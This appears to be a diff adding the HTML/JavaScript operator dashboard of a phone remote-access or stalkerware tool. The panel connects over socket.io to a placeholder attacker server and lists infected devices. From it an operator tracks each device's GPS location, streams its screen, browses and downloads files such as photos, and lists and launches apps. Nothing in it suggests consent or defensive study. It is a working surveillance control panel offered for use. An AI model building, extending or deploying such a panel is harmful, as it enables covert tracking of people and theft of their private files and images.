@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Control Center</title>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid #333;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+        h1 { font-size: 20px; }
+        #status { font-size: 12px; color: #888; }
+        .device-card {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        .device-name { font-weight: bold; }
+        .controls { margin-top: 8px; display: flex; gap: 5px; flex-wrap: wrap; }
+        .controls button {
+            background: #0a0a0a; color: #00ff00;
+            border: 1px solid #333; padding: 5px 10px;
+            border-radius: 4px; cursor: pointer;
+            font-size: 11px; font-family: monospace;
+        }
+        .controls button:hover { border-color: #00ff00; background: #1a3a1a; }
+        .panel {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .box {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            min-height: 200px;
+        }
+        .box h3 { font-size: 13px; color: #888; margin-bottom: 8px; }
+        #log {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            padding: 10px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 11px;
+            margin-top: 15px;
+        }
+        #deviceSelect {
+            background: #0a0a0a; color: #00ff00;
+            border: 1px solid #333; padding: 5px;
+            font-family: monospace; margin-bottom: 10px; width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <h1>🔴 Control Center</h1>
+            <div id="status">Connecting...</div>
+        </div>
+        <div id="count">Devices: 0</div>
+    </div>
+
+    <select id="deviceSelect">
+        <option value="">-- Select device --</option>
+    </select>
+
+    <div id="deviceList"></div>
+
+    <div class="panel">
+        <div class="box">
+            <h3>📍 Location</h3>
+            <div id="locationData" style="font-size:12px;">No data</div>
+        </div>
+        <div class="box">
+            <h3>📺 Screen</h3>
+            <div id="screenData" style="font-size:12px;">
+                <button onclick="sendCmd('START_STREAM')" style="background:#0a0a0a;color:#00ff00;border:1px solid #333;padding:5px 10px;cursor:pointer;">Start Stream</button>
+                <button onclick="sendCmd('STOP_STREAM')" style="background:#0a0a0a;color:#00ff00;border:1px solid #333;padding:5px 10px;cursor:pointer;">Stop</button>
+                <div id="screenImage" style="margin-top:8px;"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="panel">
+        <div class="box">
+            <h3>📁 Files</h3>
+            <div style="margin-bottom:5px;">
+                <button onclick="sendCmd('LIST_DOWNLOADS')" style="background:#0a0a0a;color:#00ff00;border:1px solid #333;padding:3px 6px;cursor:pointer;font-size:10px;">Downloads</button>
+                <button onclick="sendCmd('LIST_DCIM')" style="background:#0a0a0a;color:#00ff00;border:1px solid #333;padding:3px 6px;cursor:pointer;font-size:10px;">Photos</button>
+                <button onclick="sendCmd('LIST_ROOT')" style="background:#0a0a0a;color:#00ff00;border:1px solid #333;padding:3px 6px;cursor:pointer;font-size:10px;">Root</button>
+            </div>
+            <div id="fileData" style="font-size:11px;max-height:150px;overflow-y:auto;">Click a button</div>
+        </div>
+        <div class="box">
+            <h3>📱 Apps</h3>
+            <button onclick="sendCmd('LIST_APPS')" style="background:#0a0a0a;color:#00ff00;border:1px solid #333;padding:3px 6px;cursor:pointer;font-size:10px;margin-bottom:5px;">Refresh</button>
+            <div id="appData" style="font-size:11px;max-height:150px;overflow-y:auto;">Click Refresh</div>
+        </div>
+    </div>
+
+    <div id="log">=== Log ===</div>
+
+    <script>
+        const socket = io('https://YOUR_SERVER.onrender.com'); // CHANGE THIS
+        let selectedDevice = null;
+
+        socket.on('connect', () => {
+            document.getElementById('status').textContent = '🟢 Connected';
+            addLog('Connected');
+        });
+        socket.on('disconnect', () => {
+            document.getElementById('status').textContent = '🔴 Disconnected';
+        });
+
+        socket.on('device_connected', (d) => {
+            addLog(`Device: ${d.info.model}`);
+            updateDevices();
+        });
+        socket.on('device_disconnected', () => updateDevices());
+        socket.on('location_update', (d) => {
+            if (d.id === selectedDevice)
+                document.getElementById('locationData').innerHTML = `
+                    Lat: ${d.loc.lat}<br>Lon: ${d.loc.lon}<br>
+                    <a href="https://maps.google.com/maps?q=${d.loc.lat},${d.loc.lon}" target="_blank">
+                    Open in Maps</a>`;
+        });
+        socket.on('screenshot_update', (d) => {
+            if (d.id === selectedDevice)
+                document.getElementById('screenImage').innerHTML =
+                    `<img src="data:image/jpeg;base64,${d.image}" style="width:100%;max-width:300px;">`;
+        });
+        socket.on('file_list_update', (d) => {
+            if (d.id === selectedDevice) listFiles(d.files);
+        });
+        socket.on('app_list_update', (d) => {
+            if (d.id === selectedDevice) listApps(d.apps);
+        });
+
+        document.getElementById('deviceSelect').onchange = function() {
+            selectedDevice = this.value;
+            addLog(`Selected: ${selectedDevice}`);
+        };
+
+        function sendCmd(cmd) {
+            if (!selectedDevice) { addLog('No device selected'); return; }
+            socket.emit('command', { deviceId: selectedDevice, command: cmd });
+            addLog(`Cmd: ${cmd}`);
+        }
+
+        function updateDevices() {
+            fetch('/api/devices').then(r=>r.json()).then(devices => {
+                document.getElementById('count').textContent = `Devices: ${devices.length}`;
+                const sel = document.getElementById('deviceSelect');
+                sel.innerHTML = '<option value="">-- Select device --</option>';
+                const list = document.getElementById('deviceList');
+                list.innerHTML = '';
+                devices.forEach(d => {
+                    sel.innerHTML += `<option value="${d.id}">${d.info.model || 'Device'}</option>`;
+                    list.innerHTML += `<div class="device-card">
+                        <div class="device-name">${d.info.model || 'Unknown'} (${d.info.os_version || '?'})</div>
+                        <div style="font-size:11px;color:#888;">Battery: ${d.info.battery||'?'}% | ${d.id.substring(0,8)}...</div>
+                    </div>`;
+                });
+            });
+        }
+
+        function listFiles(data) {
+            try {
+                const files = JSON.parse(data);
+                document.getElementById('fileData').innerHTML = files.map(f =>
+                    `<div style="cursor:pointer;padding:2px 0;" onclick="sendCmd('DOWNLOAD:${f.path}')">
+                        ${f.isDir ? '📁' : '📄'} ${f.name}
+                    </div>`
+                ).join('');
+            } catch(e) { document.getElementById('fileData').textContent = data; }
+        }
+
+        function listApps(data) {
+            try {
+                const apps = JSON.parse(data);
+                document.getElementById('appData').innerHTML = apps.map(a =>
+                    `<div style="cursor:pointer;padding:2px 0;" onclick="sendCmd('LAUNCH:${a.package}')">
+                        📱 ${a.name || a.package}
+                    </div>`
+                ).join('');
+            } catch(e) { document.getElementById('appData').textContent = data; }
+        }
+
+        function addLog(msg) {
+            const log = document.getElementById('log');
+            const t = new Date().toLocaleTimeString();
+            log.innerHTML += `<div>[${t}] ${msg}</div>`;
+            log.scrollTop = log.scrollHeight;
+        }
+
+        setInterval(updateDevices, 5000);
+    </script>
+</body>
+</html>
